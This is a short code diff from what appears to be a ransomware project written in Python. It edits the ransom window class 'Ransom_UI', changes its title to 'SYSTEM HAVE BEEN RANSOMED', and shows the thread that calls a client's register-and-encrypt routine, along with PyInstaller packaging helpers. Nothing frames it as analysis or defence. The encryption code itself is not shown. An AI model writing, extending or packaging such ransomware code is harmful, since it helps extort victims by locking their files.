@@ -19,7 +19,7 @@ def load_or_create_access_data():
         json.dump({"first_run": now.isoformat()}, f)
     return now
 
-# ✅ CORRECT resource path (works for dev + PyInstaller)
+#solution for pyinstaller resource paths
 def resource_path(relative_path):
     if hasattr(sys, "_MEIPASS"):
         return os.path.join(sys._MEIPASS, relative_path)
@@ -30,7 +30,7 @@ class Ransom_UI(ctk.CTk):
     def __init__(self):
         super().__init__()
 
-        self.title("SYSTEM ACCESS REQUIRED")
+        self.title("SYSTEM HAVE BEEN RANSOMED")
         self.geometry("720x520")
         self.resizable(False, False)
 
@@ -121,7 +121,7 @@ class Ransom_UI(ctk.CTk):
         threading.Thread(target=self.blink_cursor, daemon=True).start()
         threading.Thread(target=self.update_timer, daemon=True).start()
 
-    # 🔒 thread-safe UI helper
+    #thread-safe UI helper
     def ui(self, fn):
         self.after(0, fn)
 
@@ -130,7 +130,7 @@ class Ransom_UI(ctk.CTk):
             client.register_and_encrypt()
         except Exception:
             self.ui(lambda: self.timer_label.configure(
-                text="SERVER ERROR ❌", text_color=self.alert_red
+                text="SERVER ERROR !!!", text_color=self.alert_red
             ))
 
     def blink_cursor(self):
